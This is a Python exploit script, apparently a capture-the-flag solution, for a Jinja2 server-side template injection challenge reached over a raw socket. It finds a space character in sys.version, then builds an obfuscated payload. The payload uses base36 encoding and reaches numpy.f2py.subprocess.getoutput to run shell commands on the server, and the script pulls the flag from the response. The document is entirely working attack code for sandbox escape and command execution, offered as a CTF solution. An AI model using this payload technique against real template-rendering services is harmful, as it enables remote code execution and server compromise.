import socket
import re
import time

HOST = "challenges.1pc.tf"   # change for your lab
PORT = 30794          # change for your lab

# ─────────────────────────────────────────────
# Base36 helper numbers
# ─────────────────────────────────────────────
FIXHELP_NUM = int("FIXHELP", 36)

# ─────────────────────────────────────────────
# Payload builder helpers
# ─────────────────────────────────────────────

def lowered(num):
    return f"numpy.char.lower(numpy.base_repr({num},36))"

def make_payload(set_expr, render_expr):
    return (
        "{{% set s = {set} ~ numpy.f2py.os.sep %}}"
        "{{{{{render}}}}}"
    ).format(set=set_expr, render=render_expr)

def build_command(space_idx):
    return make_payload(
        lowered(FIXHELP_NUM),
        f"numpy.f2py.subprocess.getoutput("
        f"numpy.f2py.os.sep ~ s[:3] ~ numpy.f2py.sys.version[{space_idx}] ~ s[3:7])"
    )

# ─────────────────────────────────────────────
# Socket send helper
# ─────────────────────────────────────────────

def send_payload(payload, timeout=8):
    with socket.create_connection((HOST, PORT), timeout=timeout) as sock:

        # wait for prompt
        buffer = b""
        while b">>> " not in buffer:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buffer += chunk

        sock.sendall((payload + "\n").encode())

        sock.settimeout(5)
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

    return response.decode(errors="replace").strip()

# ─────────────────────────────────────────────
# Dynamically detect first space in sys.version
# ─────────────────────────────────────────────

def detect_space_index():
    print("[*] Detecting space index in sys.version...")

    for i in range(0, 50):
        test_payload = f"{{{{ numpy.f2py.sys.version[{i}] }}}}"
        try:
            result = send_payload(test_payload)
            if result == " ":
                print(f"[+] Space found at index {i}")
                return i
            time.sleep(0.05)
        except:
            pass

    print("[!] Could not auto-detect space index.")
    return None

# ─────────────────────────────────────────────
# Flag extractor
# ─────────────────────────────────────────────

FLAG_RE = re.compile(r"[A-Z0-9_]{1,10}\{[^}]+\}", re.IGNORECASE)

def extract_flag(text):
    m = FLAG_RE.search(text)
    return m.group(0) if m else None

# ─────────────────────────────────────────────
# Main exploit routine
# ─────────────────────────────────────────────

def exploit():
    print("=" * 55)
    print("   Educational Jinja2 SSTI Exploit Framework")
    print("=" * 55)

    idx = detect_space_index()
    if idx is None:
        print("[-] Exploit aborted (no space found).")
        return

    payload = build_command(idx)

    print("\n[*] Payload built:")
    print(payload)

    print("\n[*] Sending exploit...")
    response = send_payload(payload, timeout=10)

    print("\n[*] Raw response:")
    print(response)

    flag = extract_flag(response)

    if flag:
        print("\n[+] FLAG FOUND:", flag)
    else:
        print("\n[-] No flag pattern detected.")

if __name__ == "__main__":
    exploit()
